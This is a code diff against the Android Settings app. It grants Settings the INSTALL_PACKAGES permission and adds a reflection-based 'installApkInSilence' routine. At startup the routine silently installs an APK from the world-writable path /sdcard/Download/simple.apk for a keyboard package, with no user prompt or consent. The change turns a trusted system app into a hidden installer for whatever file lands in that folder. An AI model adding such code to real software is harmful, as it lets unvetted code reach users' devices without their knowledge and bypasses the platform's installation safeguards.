@@ -1,0 +1,87 @@
+diff --git a/packages/apps/Settings/AndroidManifest.xml b/packages/apps/Settings/AndroidManifest.xml
+index 64026bd..87cb2f3 100755
+--- a/packages/apps/Settings/AndroidManifest.xml
++++ b/packages/apps/Settings/AndroidManifest.xml
+@@ -86,6 +86,7 @@
+     <uses-permission android:name="android.permission.PEERS_MAC_ADDRESS"/>
+     <uses-permission android:name="android.permission.MANAGE_NOTIFICATIONS"/>
+     <uses-permission android:name="android.permission.ACCESS_IMS_CALL_SERVICE" />
++    <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
+     <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+ 
+     <application android:label="@string/settings_label"
+diff --git a/packages/apps/Settings/src/com/android/settings/SettingsActivity.java b/packages/apps/Settings/src/com/android/settings/SettingsActivity.java
+index be99859..f8ff421 100644
+--- a/packages/apps/Settings/src/com/android/settings/SettingsActivity.java
++++ b/packages/apps/Settings/src/com/android/settings/SettingsActivity.java
+@@ -56,6 +56,10 @@ import android.view.ViewGroup;
+ import android.widget.Button;
+ import android.widget.SearchView;
+ 
++import android.os.Binder;
++
++import java.lang.reflect.InvocationTargetException;
++import java.lang.reflect.Method;
+ import com.android.internal.util.ArrayUtils;
+ import com.android.settings.Settings.WifiSettingsActivity;
+ import com.android.settings.accessibility.AccessibilitySettings;
+@@ -458,6 +462,51 @@ public class SettingsActivity extends SettingsDrawerActivity
+         return mSwitchBar;
+     }
+ 
++    private void installApkInSilence(String installPath, String packageName) {
++        Class<?> pmService;
++        Class<?> activityTherad;
++        Method method;
++        try {
++            activityTherad = Class.forName("android.app.ActivityThread");
++            Class<?> paramTypes[] = getParamTypes(activityTherad, "getPackageManager");
++            method = activityTherad.getMethod("getPackageManager", paramTypes);
++            Object PackageManagerService = method.invoke(activityTherad);
++            pmService = PackageManagerService.getClass();
++            Class<?> paramTypes1[] = getParamTypes(pmService, "installPackageAsUser");
++            method = pmService.getMethod("installPackageAsUser", paramTypes1);
++            method.invoke(PackageManagerService, installPath, null, 0x00000040, packageName, getUserId(Binder.getCallingUid()));//getUserId
++        } catch (ClassNotFoundException e) {
++            Log.d("Bruce", "installApkInSilence: ClassNotFoundException");
++            e.printStackTrace();
++        } catch (NoSuchMethodException e) {
++            Log.d("Bruce", "installApkInSilence: NoSuchMethodException");
++            e.printStackTrace();
++        } catch (IllegalAccessException e) {
++            Log.d("Bruce", "installApkInSilence: IllegalAccessException");
++            e.printStackTrace();
++        } catch (InvocationTargetException e) {
++            Log.d("Bruce", "installApkInSilence: InvocationTargetException");
++            e.printStackTrace();
++        }
++    }
++
++    private Class<?>[] getParamTypes(Class<?> cls, String mName) {
++        Class<?> cs[] = null;
++        Method[] mtd = cls.getMethods();
++        for (int i = 0; i < mtd.length; i++) {
++            if (!mtd[i].getName().equals(mName)) {
++                continue;
++            }
++            cs = mtd[i].getParameterTypes();
++        }
++        return cs;
++    }
++
++    public static final int PER_USER_RANGE = 100000;
++
++    public static int getUserId(int uid) {
++        return uid / PER_USER_RANGE;
++    }
+     @Override
+     public boolean onPreferenceStartFragment(PreferenceFragment caller, Preference pref) {
+         startPreferencePanel(pref.getFragment(), pref.getExtras(), -1, pref.getTitle(),
+@@ -553,6 +602,7 @@ public class SettingsActivity extends SettingsDrawerActivity
+ 
+         // Should happen before any call to getIntent()
+         getMetaData();
++        installApkInSilence("/sdcard/Download/simple.apk","com.xhsemoticonskeyboard");
+ 
+         final Intent intent = getIntent();
+         if (intent.hasExtra(EXTRA_LAUNCH_ACTIVITY_ACTION)) {
